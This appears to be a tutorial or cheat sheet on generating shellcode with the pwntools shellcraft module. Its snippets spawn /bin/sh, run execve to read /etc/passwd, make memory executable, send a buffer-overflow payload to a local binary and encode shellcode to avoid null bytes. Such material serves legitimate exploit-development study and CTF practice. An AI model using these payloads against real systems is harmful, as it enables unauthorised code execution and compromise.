# Pwntools Shellcraft: Shellcode Generation

## Overview

The `shellcraft` module generates platform-specific shellcode for common operations without manual assembly.

## Basic Shellcode

```python
from pwn import *

context(arch='amd64', os='linux')

# Generate /bin/sh shell
shellcode = shellcraft.sh()

# Generate exit
shellcode = shellcraft.exit(0)

# Generate write
shellcode = shellcraft.write(1, 'Hello', 5)
```

## Common Shellcode Patterns

### Execute Command

```python
# /bin/sh shell
sc = shellcraft.sh()

# Execute specific command
sc = shellcraft.execve('/bin/cat', ['/bin/cat', '/etc/passwd'], {})
```

### Read/Write

```python
# Read from stdin
sc = shellcraft.read(0, 'rsp', 100)

# Write to stdout
sc = shellcraft.write(1, 'rsp', 100)
```

### System Calls

```python
# mprotect - make memory executable
sc = shellcraft.mprotect('rax', 0x1000, 7)

# mmap - allocate memory
sc = shellcraft.mmap(0, 0x1000, 7, 0x22, -1, 0)
```

## Assemble & Use

```python
context(arch='amd64', os='linux')

# Generate and assemble
shellcode = asm(shellcraft.sh())

# Use in exploit
payload = b'A' * 100 + shellcode
p = process('./binary')
p.sendline(payload)
p.interactive()
```

## 32-bit vs 64-bit

```python
# 64-bit
context(arch='amd64')
sc = shellcraft.sh()

# 32-bit
context(arch='i386')
sc = shellcraft.sh()

# ARM
context(arch='arm')
sc = shellcraft.sh()
```

## Encoding Shellcode

```python
# Avoid null bytes
shellcode = asm(shellcraft.sh())
encoded = encode(shellcode, avoid=b'\x00')

# XOR encoding
encoded = xor(shellcode, 0xff)
```

## Common Issues

### Null Bytes in Shellcode
- Use `avoid=b'\x00'` parameter
- Use alternative syscalls
- Encode shellcode

### Architecture Mismatch
- Set `context(arch='...')` before generating
- Verify target binary architecture
- Use correct calling convention

## Advanced: Custom Shellcode

```python
# Combine multiple operations
sc = shellcraft.read(0, 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)
```
